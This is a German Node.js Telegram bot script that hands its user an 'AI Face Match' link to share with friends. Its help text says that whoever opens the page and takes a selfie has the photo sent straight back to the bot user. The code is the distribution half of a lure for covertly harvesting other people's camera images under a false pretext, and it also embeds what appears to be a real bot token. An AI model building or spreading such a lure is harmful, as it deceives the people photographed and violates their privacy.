// ============================================
// TELEGRAM BOT - Selfie Link Bot
// ============================================
// Starte mit: node bot.js
// Benötigt: npm install node-fetch (oder Node 18+ mit nativem fetch)
//
// Der Bot antwortet auf:
//   /start  - Begrüßung + Link
//   /link   - Nur der Link
//   Jede andere Nachricht - Hinweis auf /link
// ============================================

const BOT_TOKEN = '8843327143:AAGNinmk-Dgpch6zn2dZLd4qurvTpjEGiGU';

// ============================================
// ⚠️ WICHTIG: Hier deinen Link eintragen!
// Nachdem du die Webseite gehostet hast (z.B. über GitHub Pages, 
// Netlify, Vercel, oder einen anderen Hosting-Dienst), 
// trage hier die URL ein:
// ============================================
const WEBSITE_URL = 'https://DEIN-LINK-HIER.com';

const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
let lastUpdateId = 0;

// ============================================
// SEND MESSAGE
// ============================================
async function sendMessage(chatId, text, options = {}) {
    const body = {
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        ...options
    };

    try {
        const response = await fetch(`${API_BASE}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const data = await response.json();
        if (!data.ok) {
            console.error('❌ Fehler beim Senden:', data.description);
        }
        return data;
    } catch (err) {
        console.error('❌ Netzwerk-Fehler:', err.message);
    }
}

// ============================================
// HANDLE INCOMING MESSAGES
// ============================================
async function handleMessage(message) {
    const chatId = message.chat.id;
    const text = (message.text || '').trim().toLowerCase();
    const firstName = message.from?.first_name || 'du';

    console.log(`📨 Nachricht von ${firstName} (${chatId}): ${text}`);

    switch (text) {
        case '/start':
            await sendMessage(chatId,
                `👋 Hey <b>${firstName}</b>!\n\n` +
                `Willkommen beim <b>AI Face Match Bot</b>! 🤖✨\n\n` +
                `Hier ist dein Link zum Teilen:\n` +
                `🔗 <a href="${WEBSITE_URL}">${WEBSITE_URL}</a>\n\n` +
                `Schick den Link einfach an deine Freunde und ` +
                `schau was passiert! 😏\n\n` +
                `Befehle:\n` +
                `📎 /link - Link nochmal anzeigen\n` +
                `ℹ️ /help - Hilfe anzeigen`
            );
            break;

        case '/link':
            await sendMessage(chatId,
                `🔗 Hier ist dein Link:\n\n` +
                `<a href="${WEBSITE_URL}">${WEBSITE_URL}</a>\n\n` +
                `Einfach kopieren und teilen! 📤`
            );
            break;

        case '/help':
            await sendMessage(chatId,
                `ℹ️ <b>Hilfe</b>\n\n` +
                `Dieser Bot gibt dir den Link zur AI Face Match Webseite.\n\n` +
                `<b>Befehle:</b>\n` +
                `📎 /link - Link anzeigen\n` +
                `🏠 /start - Begrüßung\n` +
                `ℹ️ /help - Diese Hilfe\n\n` +
                `Wenn jemand die Seite öffnet und ein Selfie macht, ` +
                `bekommst du es direkt hierher geschickt! 📸`
            );
            break;

        default:
            await sendMessage(chatId,
                `🤔 Ich verstehe nur Befehle!\n\n` +
                `Probier mal /link um den Link zu bekommen 📎`
            );
            break;
    }
}

// ============================================
// POLLING - Check for new messages
// ============================================
async function pollUpdates() {
    try {
        const response = await fetch(
            `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
        );
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;
                if (update.message) {
                    await handleMessage(update.message);
                }
            }
        }
    } catch (err) {
        console.error('⚠️ Polling-Fehler:', err.message);
        // Wait a bit before retrying on error
        await new Promise(r => setTimeout(r, 3000));
    }
}

// ============================================
// MAIN LOOP
// ============================================
async function main() {
    console.log('🤖 Bot wird gestartet...');
    
    // Verify bot connection
    try {
        const response = await fetch(`${API_BASE}/getMe`);
        const data = await response.json();
        if (data.ok) {
            console.log(`✅ Verbunden als: @${data.result.username} (${data.result.first_name})`);
        } else {
            console.error('❌ Bot-Token ungültig!');
            process.exit(1);
        }
    } catch (err) {
        console.error('❌ Verbindung fehlgeschlagen:', err.message);
        process.exit(1);
    }

    console.log('📡 Warte auf Nachrichten...\n');

    // Start polling loop
    while (true) {
        await pollUpdates();
    }
}

main();
